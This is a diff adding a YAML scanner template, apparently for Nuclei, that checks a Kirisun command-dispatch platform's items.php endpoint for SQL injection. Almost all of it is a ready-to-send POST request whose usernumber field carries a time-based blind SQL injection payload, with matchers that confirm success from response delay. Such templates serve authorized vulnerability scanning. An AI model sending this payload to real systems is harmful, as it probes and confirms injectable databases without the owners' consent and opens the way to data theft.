@@ -1,0 +1,32 @@
+id: poc-yaml-kirisun-items-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 items.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /api/get_sos/items.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1' AND (SELECT 5464 FROM (SELECT(SLEEP({{t1}})))FZxX) AND 'khLM'='khLM
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"code":"-1"'
+          - 'user not found'
+      - type: regex
+        regex:
+          - '^((?!<).)*$'
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
